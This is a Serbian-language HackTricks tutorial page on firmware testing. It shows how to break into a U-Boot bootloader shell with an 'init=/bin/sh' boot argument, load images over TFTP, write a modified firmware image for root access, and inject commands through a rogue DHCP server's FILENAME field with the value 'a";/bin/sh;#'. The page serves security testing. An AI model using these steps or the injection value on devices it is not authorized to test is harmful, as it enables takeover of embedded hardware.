<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJEM**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Preporučeni koraci za modifikaciju konfiguracija pokretanja uređaja i bootloadera poput U-boot-a su:

1. **Pristup Interpreter Shell-u Bootloader-a**:
- Tokom pokretanja, pritisnite "0", razmak ili druge identifikovane "magične kodove" da biste pristupili interpreter shell-u bootloader-a.

2. **Modifikacija Pokretnih Argumenata**:
- Izvršite sledeće komande da biste dodali '`init=/bin/sh`' na pokretne argumente, omogućavajući izvršenje shell komande:
%%%
#printenv
#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
#saveenv
#boot
%%%

3. **Podesite TFTP Server**:
- Konfigurišite TFTP server za učitavanje slika preko lokalne mreže:
%%%
#setenv ipaddr 192.168.2.2 #lokalna IP adresa uređaja
#setenv serverip 192.168.2.1 #IP adresa TFTP servera
#saveenv
#reset
#ping 192.168.2.1 #provera pristupa mreži
#tftp ${loadaddr} uImage-3.6.35 #loadaddr uzima adresu za učitavanje fajla i ime fajla slike na TFTP serveru
%%%

4. **Iskoristite `ubootwrite.py`**:
- Koristite `ubootwrite.py` da napišete U-boot sliku i pošaljete modifikovan firmware kako biste dobili root pristup.

5. **Proverite Debug Funkcije**:
- Verifikujte da li su debug funkcije poput detaljnog logovanja, učitavanje proizvoljnih kernela ili pokretanje sa nepoverenih izvora omogućene.

6. **Oprez pri Mešanju Hardvera**:
- Budite oprezni kada povezujete jedan pin sa zemljom i interagujete sa SPI ili NAND flash čipovima tokom sekvence pokretanja uređaja, posebno pre dekompresije jezgra. Konsultujte datasheet NAND flash čipa pre spajanja pinova.

7. **Podesite Rogue DHCP Server**:
- Postavite rogue DHCP server sa zlonamernim parametrima za uređaj da ih usvoji tokom PXE pokretanja. Iskoristite alate poput Metasploit-ovog (MSF) DHCP pomoćnog servera. Modifikujte parametar 'FILENAME' sa komandama za ubacivanje komandi kao što su `'a";/bin/sh;#'` da biste testirali validaciju unosa za postupke pokretanja uređaja.

**Napomena**: Koraci koji uključuju fizičku interakciju sa pinovima uređaja (*označeni zvezdicom) treba da se pristupe sa ekstremnim oprezom kako bi se izbegla šteta uređaju.


## Reference
* [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
